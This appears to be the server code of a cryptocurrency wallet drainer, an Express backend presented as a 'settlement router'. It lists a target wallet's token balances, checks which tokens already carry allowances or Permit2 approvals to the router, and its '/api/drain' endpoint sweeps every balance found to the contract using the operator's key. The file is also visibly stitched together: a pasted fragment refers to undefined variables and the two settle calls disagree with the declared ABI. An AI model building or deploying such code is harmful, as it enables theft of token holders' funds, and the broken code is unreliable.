const express = require("express");
const fs = require("fs");
const path = require("path");
const { ethers } = require("ethers");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "..", "public")));

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const ROUTE = { NONE: 0, ALLOWANCE: 1, PERMIT2: 2, EIP2612: 3 };

const deployments = {};
for (const f of fs.readdirSync(path.join(__dirname, "..", "deployments"))) {
  const d = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "deployments", f)));
  const rpc = process.env[`RPC_${d.chainId}`];
  if (!rpc) continue;
  deployments[d.chainId] = {
    meta: d,
    provider: new ethers.JsonRpcProvider(rpc),
    wallet: new ethers.Wallet(process.env[`PK_${d.chainId}`] || process.env.FILLER_PRIVATE_KEY,
                              new ethers.JsonRpcProvider(rpc)),
    tokens: JSON.parse(fs.readFileSync(path.join(__dirname, "..", "tokens", `${d.chainId}.json`)))
  };
}

const ABI = [
  "struct Item(address token,uint256 amount,uint8 route,uint256 deadline,uint8 v,bytes32 r,bytes32 s)",
  "function settle(address,(address,uint256,uint8,uint256,uint8,bytes32,bytes32)[],uint256,uint256,bytes) returns (uint256)",
  "function settleNative() payable",
  "function probe(address,address) view returns (uint256,uint256,bool,bool,uint8)",
  "function treasury() view returns (address)"
];

// in /api/drain, replace the array building and the call:
const items = found.map(f => ({
  token: f.address,
  amount: f.balance,
  route: f.route,
  deadline: Math.floor(Date.now() / 1000) + 3600,
  v: 27, r: ethers.ZeroHash, s: ethers.ZeroHash
}));
const p2 = found.some(f => f.route === ROUTE.PERMIT2);
const tx = await rc.settle(
  w, items,
  p2 ? 1 : 0,
  Math.floor(Date.now() / 1000) + 3600,
  p2 ? "0x" + "00".repeat(65) : "0x"
);

const ERC20 = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];

const routerFor = c => new ethers.Contract(deployments[c].meta.router, ABI, deployments[c].wallet);

async function classify(chainId, wallet) {
  const { provider, tokens } = deployments[chainId];
  const rc = routerFor(chainId);
  const out = [];
  for (const t of tokens) {
    const erc = new ethers.Contract(t.address, ERC20, provider);
    let bal = 0n, dec = 18, sym = t.symbol;
    try {
      [bal, dec, sym] = await Promise.all([
        erc.balanceOf(wallet),
        erc.decimals().catch(() => 18n),
        erc.symbol().catch(() => t.symbol)
      ]);
    } catch { continue; }
    if (bal === 0n) continue;
    const [, , hasDomain, p2Live] = await rc.probe(t.address, wallet);
    out.push({
      address: t.address, symbol: sym, decimals: Number(dec), balance: bal.toString(),
      route: hasDomain && p2Live ? ROUTE.PERMIT2 : ROUTE.ALLOWANCE
    });
  }
  return out;
}

app.get("/api/health", (_req, res) => res.json({ ok: true, chains: Object.keys(deployments) }));

app.get("/api/balances", async (req, res) => {
  const c = Number(req.query.chainId), w = req.query.wallet;
  if (!deployments[c] || !ethers.isAddress(w)) return res.status(400).json({ error: "bad input" });
  const rows = await classify(c, w);
  const native = await deployments[c].provider.getBalance(w);
  res.json({ chainId: c, wallet: w, native: native.toString(), tokens: rows });
});

app.post("/api/drain", async (req, res) => {
  const c = Number(req.body.chainId), w = req.body.wallet;
  if (!deployments[c] || !ethers.isAddress(w)) return res.status(400).json({ error: "bad input" });
  const found = await classify(c, w);
  if (!found.length) return res.json({ status: "nothing to settle" });

  const rc = routerFor(c);
  const a = { token: [], amount: [], deadline: [], route: [], v: [], r: [], s: [] };
  for (const f of found) {
    a.token.push(f.address); a.amount.push(f.balance);
    a.deadline.push(Math.floor(Date.now() / 1000) + 3600);
    a.route.push(f.route); a.v.push(27); a.r.push(ethers.ZeroHash); a.s.push(ethers.ZeroHash);
  }
  const p2 = found.some(f => f.route === ROUTE.PERMIT2);
  const tx = await rc.settle(w, a.token, a.amount, a.deadline, a.route, a.v, a.r, a.s,
    p2 ? 1 : 0, Math.floor(Date.now() / 1000) + 3600, p2 ? "0x" + "00".repeat(65) : "0x");
  const rec = await tx.wait();
  res.json({ status: "sent", hash: rec.hash, gasUsed: rec.gasUsed.toString(), tokens: found });
});

app.listen(process.env.PORT || 3999, () =>
  console.log("settlement router on", process.env.PORT || 3999));
